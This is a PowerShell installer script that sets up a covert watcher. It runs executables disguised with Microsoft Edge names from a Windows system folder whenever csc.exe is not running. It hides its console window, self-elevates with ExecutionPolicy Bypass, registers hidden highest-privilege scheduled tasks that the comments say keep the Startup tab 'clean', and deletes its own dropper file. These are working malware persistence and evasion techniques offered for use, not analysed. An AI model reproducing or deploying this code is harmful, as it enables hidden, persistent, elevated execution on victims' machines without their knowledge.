# =============================================================================
# CSCWatcher.ps1  (multi-target, level check every PollSeconds, ALWAYS ELEVATED)
# Every PollSeconds: check if csc.exe is running.
#   - Not running -> launch every target that hasn't been launched yet
#   - Running     -> reset all latches so we can fire again next time
#
# Run ONCE as Administrator. Self-deletes %USERPROFILE%\life.ps1 when done.
# =============================================================================

# ---------------------------------------------------------------------------
# CONFIGURATION
# ---------------------------------------------------------------------------
# Add as many paths as you want. Each is launched independently.
$TargetExes = @(
    "C:\Windows\Globalization\Sorting\Browser\MicrosoftEdge.exe",
    "C:\Windows\Globalization\Sorting\Browser\Edgebrowser.exe"
)

$WatchProcess = "csc"        # process name without .exe
$PollSeconds  = 30            # how often to check
$TargetUser   = $null        # $null = auto-detect

$OutputDir  = "C:\Windows\cax"
$PS1Path    = Join-Path $OutputDir "CSCWatcher_Run.ps1"
$VBSPath    = Join-Path $OutputDir "Launch-CSCWatcher.vbs"
$logonTask  = "CSCWatcher_Logon"
$runTask    = "CSCWatcher_StartNow"

# File to delete after this installer finishes
$SelfDeletePath = Join-Path $env:USERPROFILE "life.ps1"
# ---------------------------------------------------------------------------

Write-Host ""
Write-Host "=== CSCWatcher installer (multi-target) ===" -ForegroundColor Cyan
Write-Host ""

# =============================================================================
# STEP 0 - TERMINATE ANY RUNNING csc.exe BEFORE DOING ANYTHING ELSE
# =============================================================================
Write-Host "[0/6] Terminating any running csc.exe..." -ForegroundColor Yellow

$cscProcs = Get-Process -Name $WatchProcess -ErrorAction SilentlyContinue
if ($cscProcs) {
    foreach ($p in $cscProcs) {
        Write-Host "      Stopping csc.exe PID $($p.Id)"
        Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
    }
    # Give the OS a moment to release handles
    Start-Sleep -Milliseconds 500
    Write-Host "      csc.exe terminated." -ForegroundColor Green
} else {
    Write-Host "      No csc.exe running." -ForegroundColor DarkGray
}
Write-Host ""

# =============================================================================
# STEP 1 - CLEAN UP ANY EXISTING INSTALL
# =============================================================================
Write-Host "[1/6] Removing any previous install..." -ForegroundColor Yellow

Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -match 'CSCWatcher_Run|ChromeOnIdle_Run' } |
    ForEach-Object {
        Write-Host "      Killing stale watcher PID $($_.ProcessId)"
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    }

Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -match 'Launch-CSCWatcher|Launch-ChromeOnIdle' } |
    ForEach-Object {
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
    }

foreach ($t in @($logonTask, $runTask, 'ChromeOnIdle_Logon', 'ChromeOnIdle_StartNow')) {
    $exists = schtasks /Query /TN $t 2>$null
    if ($LASTEXITCODE -eq 0) {
        schtasks /Delete /TN $t /F 2>$null | Out-Null
        Write-Host "      Removed scheduled task: $t"
    }
}

foreach ($f in @($PS1Path, $VBSPath,
                 (Join-Path $OutputDir 'ChromeOnIdle_Run.ps1'),
                 (Join-Path $OutputDir 'Launch-ChromeOnIdle.vbs'))) {
    if (Test-Path $f) {
        Remove-Item $f -Force -ErrorAction SilentlyContinue
        Write-Host "      Removed file: $f"
    }
}

# Clean up any leftover Startup-folder copies from older versions
Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    foreach ($name in @('Launch-CSCWatcher.vbs','Launch-ChromeOnIdle.vbs')) {
        $s = Join-Path $_.FullName "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$name"
        if (Test-Path $s) {
            Remove-Item $s -Force -ErrorAction SilentlyContinue
            Write-Host "      Removed startup shortcut: $s"
        }
    }
}
foreach ($name in @('Launch-CSCWatcher.vbs','Launch-ChromeOnIdle.vbs')) {
    $cs = Join-Path $env:ProgramData "Microsoft\Windows\Start Menu\Programs\Startup\$name"
    if (Test-Path $cs) {
        Remove-Item $cs -Force -ErrorAction SilentlyContinue
        Write-Host "      Removed common startup shortcut: $cs"
    }
}

Write-Host "      Cleanup done." -ForegroundColor Green
Write-Host ""

# =============================================================================
# STEP 2 - DETECT THE INTERACTIVE USER
# =============================================================================
Write-Host "[2/6] Detecting interactive user..." -ForegroundColor Yellow

$badAccounts = @('SYSTEM','LOCAL SERVICE','NETWORK SERVICE','ANONYMOUS LOGON',
                 'DEFAULTUSER0','UMFD-0','UMFD-1','DWM-1','DWM-2','')

function Test-RealUser {
    param([string]$Name)
    if (-not $Name) { return $false }
    if ($Name.EndsWith('$')) { return $false }
    if ($Name -in $badAccounts) { return $false }
    if ($Name -match '^(UMFD|DWM)-\d+$') { return $false }
    if (-not (Test-Path "C:\Users\$Name\NTUSER.DAT")) { return $false }
    return $true
}

if (-not $TargetUser) {
    try {
        $sessions = quser 2>$null
        if ($sessions) {
            $sessions = $sessions -split "`r?`n" | Select-Object -Skip 1
            foreach ($line in $sessions) {
                if ($line -match 'Disc|Services') { continue }
                $clean = $line -replace '^\s*>?\s*', ''
                $raw   = ($clean -split '\s+')[0]
                $name  = ($raw -split '\\')[-1]
                if (Test-RealUser $name) { $TargetUser = $name; break }
            }
        }
    } catch { }

    if (-not $TargetUser) {
        try {
            $explorer = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction Stop |
                ForEach-Object {
                    $owner = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction SilentlyContinue
                    if ($owner -and $owner.User) { $owner.User }
                } | Where-Object { Test-RealUser $_ } | Select-Object -First 1
            if ($explorer) { $TargetUser = $explorer }
        } catch { }
    }

    if (-not $TargetUser -and (Test-RealUser $env:USERNAME)) { $TargetUser = $env:USERNAME }

    if (-not $TargetUser) {
        $skip = @('Public','Default','Default User','All Users','WDAGUtilityAccount')
        $TargetUser = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -notin $skip -and (Test-Path (Join-Path $_.FullName 'NTUSER.DAT')) } |
            Sort-Object { (Get-Item (Join-Path $_.FullName 'NTUSER.DAT')).LastWriteTime } -Descending |
            Select-Object -First 1 -ExpandProperty Name
    }
}

if (-not (Test-RealUser $TargetUser)) {
    throw "Could not determine the interactive user (got '$TargetUser'). Set `$TargetUser explicitly."
}
Write-Host "      Target user: $TargetUser" -ForegroundColor Green
Write-Host ""

# =============================================================================
# STEP 3 - WRITE FILES
# =============================================================================
Write-Host "[3/6] Writing files..." -ForegroundColor Yellow

if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
}

# Build a PowerShell array literal for the embedded script
$pathsArrayLiteral = ($TargetExes | ForEach-Object { '"' + ($_ -replace '"','`"') + '"' }) -join ",`r`n    "

# ---------------------------------------------------------------------------
# Level check every PollSeconds. One latch per target.
# ALWAYS ELEVATED:
#   - self-elevates on startup if not already admin
#   - launches children with -Verb RunAs (prompt-free while elevated)
# ---------------------------------------------------------------------------
$ps1Content = @"
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class ConsoleWindow {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    static ConsoleWindow() { ShowWindow(GetConsoleWindow(), 0); }
}
'@
[ConsoleWindow] | Out-Null

`$TargetExes = @(
    $pathsArrayLiteral
)
`$WatchProcess = "$WatchProcess"
`$PollSeconds  = $PollSeconds
`$ErrorActionPreference = "SilentlyContinue"

# ---------------------------------------------------------------------------
# ENSURE WE ARE RUNNING ELEVATED. If not, relaunch ourselves elevated and exit.
# ---------------------------------------------------------------------------
`$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
`$principal = New-Object Security.Principal.WindowsPrincipal(`$identity)
if (-not `$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    `$self = `$PSCommandPath
    if (-not `$self) { `$self = `$MyInvocation.MyCommand.Path }
    try {
        Start-Process -FilePath "powershell.exe" ``
            -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"`$self`"" ``
            -Verb RunAs -ErrorAction Stop
    } catch { }
    exit
}

# One latch per target so each launches at most once per csc-closed period
`$launched = @{}
foreach (`$exe in `$TargetExes) { `$launched[`$exe] = `$false }

while (`$true) {
    `$running = [bool](Get-Process -Name `$WatchProcess -ErrorAction SilentlyContinue)

    if (-not `$running) {
        foreach (`$exe in `$TargetExes) {
            if (-not `$launched[`$exe]) {
                if (Test-Path `$exe) {
                    try {
                        # Parent is elevated -> RunAs elevates silently, no UAC prompt.
                        Start-Process -FilePath `$exe -Verb RunAs -ErrorAction Stop
                    } catch {
                        # Fallback (should not happen while elevated)
                        Start-Process -FilePath `$exe
                    }
                }
                `$launched[`$exe] = `$true
            }
        }
    } else {
        foreach (`$exe in `$TargetExes) { `$launched[`$exe] = `$false }
    }

    Start-Sleep -Seconds `$PollSeconds
}
"@

$q = '"'
$vbsContent  = 'Dim ps1' + "`r`n"
$vbsContent += 'ps1 = ' + $q + $PS1Path + $q + "`r`n"
$vbsContent += 'CreateObject("WScript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File " & Chr(34) & ps1 & Chr(34), 0, False' + "`r`n"

$ps1Content | Set-Content -Path $PS1Path -Encoding UTF8
[System.IO.File]::WriteAllText($VBSPath, $vbsContent, [System.Text.Encoding]::ASCII)

Write-Host "      Wrote: $PS1Path"
Write-Host "      Wrote: $VBSPath"
Write-Host ""

# =============================================================================
# STEP 4 - REGISTER HIDDEN, ELEVATED SCHEDULED TASKS
# =============================================================================
Write-Host "[4/6] Registering hidden scheduled tasks as $TargetUser..." -ForegroundColor Yellow

# Build the task definition via the ScheduledTasks module so we can set Hidden + Highest.
$taskAction  = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VBSPath`""
$taskPrincipal = New-ScheduledTaskPrincipal -UserId $TargetUser -RunLevel Highest -LogonType Interactive
$taskSettings  = New-ScheduledTaskSettingsSet -Hidden
$taskSettings.DisallowStartIfOnBatteries = $false
$taskSettings.StopIfGoingOnBatteries     = $false
$taskSettings.AllowStartIfOnBatteries    = $true

# Logon task
$logonTrigger = New-ScheduledTaskTrigger -AtLogOn -User $TargetUser
$logonDef     = New-ScheduledTask -Action $taskAction -Trigger $logonTrigger `
                                  -Principal $taskPrincipal -Settings $taskSettings
Register-ScheduledTask -TaskName $logonTask -InputObject $logonDef -Force | Out-Null

# "Start now" task (fires once on demand)
$onceTrigger  = New-ScheduledTaskTrigger -Once -At (Get-Date)
$onceTrigger.EndBoundary = (Get-Date).AddYears(10).ToString("s")
$runDef       = New-ScheduledTask -Action $taskAction -Trigger $onceTrigger `
                                  -Principal $taskPrincipal -Settings $taskSettings
Register-ScheduledTask -TaskName $runTask -InputObject $runDef -Force | Out-Null

Write-Host "      Logon task : $logonTask (hidden, highest)"
Write-Host "      Now task   : $runTask (hidden, highest)"
Write-Host "      (No Startup-folder entry created - Task Manager Startup tab stays clean.)"
Write-Host ""

# =============================================================================
# STEP 5 - START WATCHER NOW
# =============================================================================
Write-Host "[5/6] Starting watcher now as $TargetUser..." -ForegroundColor Yellow

Start-ScheduledTask -TaskName $runTask
Start-Sleep -Seconds 2

Write-Host "      Watcher started."
Write-Host ""

# =============================================================================
# STEP 6 - SELF-DELETE %USERPROFILE%\life.ps1 AFTER INSTALL COMPLETES
# =============================================================================
Write-Host "[6/6] Scheduling self-delete of: $SelfDeletePath" -ForegroundColor Yellow

if (Test-Path $SelfDeletePath) {
    # A running script cannot delete its own file (it is locked while executing).
    # Spawn a detached, hidden cmd that waits a few seconds for THIS process to
    # exit (releasing the lock), then deletes the file.
    $delCmd = 'ping -n 4 127.0.0.1 >nul & del /f /q "' + $SelfDeletePath + '"'
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $delCmd" -WindowStyle Hidden | Out-Null
    Write-Host "      Self-delete queued (will run after this installer exits)." -ForegroundColor Green
} else {
    Write-Host "      Not found at $SelfDeletePath - nothing to delete." -ForegroundColor DarkGray
}
Write-Host ""

Write-Host "=== Done ===" -ForegroundColor Green
Write-Host "Every $PollSeconds s: if '$WatchProcess.exe' is not running, launch (elevated):" -ForegroundColor Cyan
foreach ($p in $TargetExes) { Write-Host "  $p" -ForegroundColor Cyan }
Write-Host ""
Write-Host "Verify with:"
Write-Host "  Get-ScheduledTask -TaskName '$logonTask','$runTask' | Select TaskName,State,Settings"
Write-Host "  tasklist /FI `"IMAGENAME eq powershell.exe`" /V /FO LIST"
Write-Host "  tasklist /FI `"IMAGENAME eq $WatchProcess.exe`""
Write-Host ""